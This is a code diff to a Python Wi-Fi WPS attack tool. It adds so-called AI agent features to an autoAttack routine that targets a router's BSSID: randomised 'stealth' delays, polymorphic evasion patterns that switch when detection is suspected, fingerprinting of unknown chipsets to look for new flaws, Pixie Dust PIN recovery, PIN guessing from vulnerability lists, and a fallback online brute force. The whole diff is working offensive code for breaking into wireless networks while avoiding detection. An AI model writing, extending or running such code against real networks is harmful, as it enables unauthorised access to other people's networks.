@@ -6953,6 +6953,26 @@ class AIAgent:
             if learned and learned in self.ACTIONS:
                 return learned
 
+        # ADVANCEMENT 8: Chain of Thought reasoning
+        thought = self.cognition.think(ctx, phase)
+        if thought and thought.get('confidence', 0) > 0.85:
+            if thought['conclusion'] in self.ACTIONS:
+                return thought['conclusion']
+
+        # FINAL: Mathematical Reasoning — probability-based decision boost
+        try:
+            sig = ctx.get('signal', -50)
+            timeout_rate = ctx.get('timeouts', 0) / max(ctx.get('attempt', 1), 1)
+            p_success = self.math_brain.probability(
+                ctx.get('m_msgs', 0), ctx.get('m_msgs', 0) + ctx.get('timeouts', 0) + 1
+            )
+            if p_success < 0.1:
+                return 'abort'
+            elif p_success > 0.7 and sig > -60:
+                return 'proceed'
+        except Exception:
+            pass
+
         if _rng.random() < profile_epsilon:
             explore_actions = [a for a in self.ACTIONS]
             if ctx.get('signal', -50) > -60 and not ctx.get('wps_locked', False):
@@ -7107,6 +7127,25 @@ class AIAgent:
             self.jitter.record_attempt(ctx.get('wps_locked', False))
         except Exception:
             pass
+        # FINAL: DynamicPacing — record attempt for pacing adaptation
+        try:
+            self.dynamic_pacing.record_attempt(success, reward)
+        except Exception:
+            pass
+        # FINAL: Resilience — classify error if failure
+        if not success:
+            try:
+                    self.resilience.handle_error(Exception('connection_failure'), ctx)
+            except Exception:
+                pass
+            # ═══ INTEGRATION: ZeroDayHunter — check if unknown device is interesting ═══
+            try:
+                bssid = ctx.get('bssid', '00:00:00:00:00:00')
+                chip = fingerprint_chipset(bssid)
+                if chip.get('chipset') == 'unknown':
+                    self.zero_day_hunter.fingerprint_device(bssid, [ctx])
+            except Exception:
+                pass
         # ADVANCEMENT 8: Reflexion — record outcome for episodic memory
         try:
             self.cognition.record_outcome(ctx, action, success)
@@ -7210,6 +7249,40 @@ def autoAttack(interface: str, bssid: str, vuln_list_file: str,
     agent     = AIAgent(profile=getattr(args, 'profile', 'balanced'))
     generator = src.wps.generator.WPSpin()
 
+    # ═══ INTEGRATION: AdaptiveEvasion — generate polymorphic pattern ═══
+    evasion_pattern = agent.adaptive_evasion.generate_evasion_pattern('browser')
+    logger.info(f'[Evasion] Session {evasion_pattern["session_id"]} — '
+                f'delay_base={evasion_pattern["delay_base"]}s, '
+                f'ttl={evasion_pattern["ttl_value"]}')
+
+    # ═══ INTEGRATION: SwarmMode — detect available interfaces ═══
+    active_ifaces = agent.swarm.detect_interfaces()
+    if len(active_ifaces) > 1:
+        logger.info(f'[Swarm] {len(active_ifaces)} adapters detected: {active_ifaces}')
+        agent.swarm.set_primary(interface)
+
+    # ═══ INTEGRATION: ZeroDayHunter — fingerprint unknown device ═══
+    chip_info = fingerprint_chipset(bssid)
+    if chip_info.get('chipset') == 'unknown':
+        discovery = agent.zero_day_hunter.discover_zero_day(bssid, {
+            'signal': network_info.get('Level', -50) if network_info else -50,
+            'wps_version': network_info.get('WPS version', '1.0') if network_info else '1.0',
+            'wps_locked': network_info.get('WPS locked', False) if network_info else False,
+        })
+        if discovery.get('suggested_vectors'):
+            logger.info(f'[ZeroDay] Unknown device — vuln_score={discovery["vuln_score"]:.2f}, '
+                        f'vectors={discovery["suggested_vectors"]}')
+
+    # ═══ INTEGRATION: CVEParser — parse vuln list for intel ═══
+    try:
+        with open(vuln_list_file, 'r') as vf:
+            vuln_text = vf.read()
+        cve_matches = agent.cve_parser.parse(vuln_text)
+        if cve_matches:
+            logger.info(f'[CVE] Found {len(cve_matches)} vulnerability signatures in target list')
+    except Exception:
+        pass
+
     # Build initial context from scan data
     ctx = {
         'bssid':         bssid,
@@ -7242,14 +7315,48 @@ def autoAttack(interface: str, bssid: str, vuln_list_file: str,
             for algo in algos:
                 pin = algo.get('pin', '')
                 if pin:
+                    # ═══ INTEGRATION: StealthJitter — random micro-delay ═══
+                    jitter_delay = agent.jitter.next_delay()
+                    if jitter_delay > 0:
+                        logger.info(f'[Jitter] Adding {jitter_delay:.3f}s stealth delay')
+                        time.sleep(jitter_delay)
+
+                    # ═══ INTEGRATION: DynamicPacing — adaptive delay ═══
+                    pacing_delay = agent.dynamic_pacing.next_delay()
+                    if pacing_delay > 0:
+                        logger.info(f'[Pacing] Adaptive delay: {pacing_delay:.3f}s')
+                        time.sleep(pacing_delay)
+
                     logger.info(f'[AI] Trying PIN \'{pin}\' ({algo["name"]})')
-                    success = connection.singleConnection(bssid, pin)
+                    try:
+                        success = connection.singleConnection(bssid, pin)
+                    except Exception as e:
+                        # ═══ INTEGRATION: ErrorInterpreter — classify & recover ═══
+                        err_info = agent.error_interpreter.interpret(e)
+                        logger.error(f'[ErrorInterpreter] {err_info["category"]}: {err_info["explanation"]}')
+                        if 'retry' in str(err_info.get('recovery', '')).lower():
+                            time.sleep(agent.jitter.next_delay())
+                            success = connection.singleConnection(bssid, pin)
+                        else:
+                            success = False
+
                     cs = connection.CONNECTION_STATUS
                     ctx['m_msgs']   = cs.LAST_M_MESSAGE
                     ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
                     ctx['fails']    = 0 if success else 1
+                    # ═══ INTEGRATION: CodeIntelligence — parse tool output ═══
+                    try:
+                        parsed = agent.code_intel.interpret_tool_output('pixiewps',
+                            getattr(cs, 'LAST_OUTPUT', '') or ''
+                        )
+                        if parsed.get('action') == 'connect_with_pin':
+                            logger.info(f'[CodeIntel] Tool output suggests direct PIN connection')
+                    except Exception:
+                        pass
                     agent.record(ctx, 'proceed', success)
                     if success:
+                        agent.adaptive_evasion._evasion_count += 1
+                        agent.adaptive_evasion._save()
                         agent.finalize()
                         return True
             logger.warning('[AI] Vuln list PINs did not succeed')
@@ -7272,13 +7379,34 @@ def autoAttack(interface: str, bssid: str, vuln_list_file: str,
         likely_pin = explicit_pin or generator.getLikely(bssid) or '12345670'
         connection = src.wps.connection.Initialize(interface)
 
+        # ═══ INTEGRATION: MAB — predict optimal timeout ═══
+        optimal_timeout = agent.predict_timeout(5.0, ctx)
+        logger.info(f'[MAB] Optimal timeout: {optimal_timeout:.2f}s')
+
+        # ═══ INTEGRATION: StealthJitter before Pixie Dust ═══
+        time.sleep(agent.jitter.next_delay())
+
         saved_pixie = args.pixie_dust
         args.pixie_dust = True
-        success = connection.singleConnection(bssid, likely_pin)
+        try:
+            success = connection.singleConnection(bssid, likely_pin)
+        except Exception as e:
+            err_info = agent.error_interpreter.interpret(e)
+            logger.error(f'[ErrorInterpreter] {err_info["category"]}: {err_info["explanation"]}')
+            success = False
         cs = connection.CONNECTION_STATUS
         ctx['m_msgs']   = cs.LAST_M_MESSAGE
         ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
         ctx['fails']    = 0 if success else 1
+        # ═══ INTEGRATION: CodeIntelligence — parse Pixie Dust output ═══
+        try:
+            parsed = agent.code_intel.parse_pixiewps_output(
+                getattr(cs, 'LAST_OUTPUT', '') or ''
+            )
+            if parsed.get('action') == 'use_pin':
+                logger.info(f'[CodeIntel] Pixie Dust recovered PIN: {parsed.get("pin", "?")}')
+        except Exception:
+            pass
         agent.record(ctx, 'proceed', success)
         args.pixie_dust = saved_pixie
 
@@ -7303,6 +7431,21 @@ def autoAttack(interface: str, bssid: str, vuln_list_file: str,
         return False
 
     logger.info('[AI] Falling back to online bruteforce...')
+    # ═══ INTEGRATION: AdaptiveEvasion — switch to stealth pattern ═══
+    agent.adaptive_evasion.record_detection()  # mark as needing stealth
+    if agent.adaptive_evasion.should_switch_template():
+        new_tmpl = agent.adaptive_evasion.get_next_template()
+        evasion_pattern = agent.adaptive_evasion.generate_evasion_pattern(new_tmpl)
+        logger.info(f'[Evasion] Switched to {new_tmpl} pattern')
+
+    # ═══ INTEGRATION: DynamicPacing — slow down for bruteforce ═══
+    agent.dynamic_pacing.switch_profile('cautious')
+    agent.dynamic_pacing._save()
+
+    # ═══ INTEGRATION: MAB — optimal bruteforce timeout ═══
+    bf_timeout = agent.predict_timeout(3.0, ctx)
+    logger.info(f'[MAB] Bruteforce timeout: {bf_timeout:.2f}s')
+
     bf = src.wps.bruteforce.Initialize(interface)
     bf.smartBruteforce(bssid, '0000')
     agent.finalize()
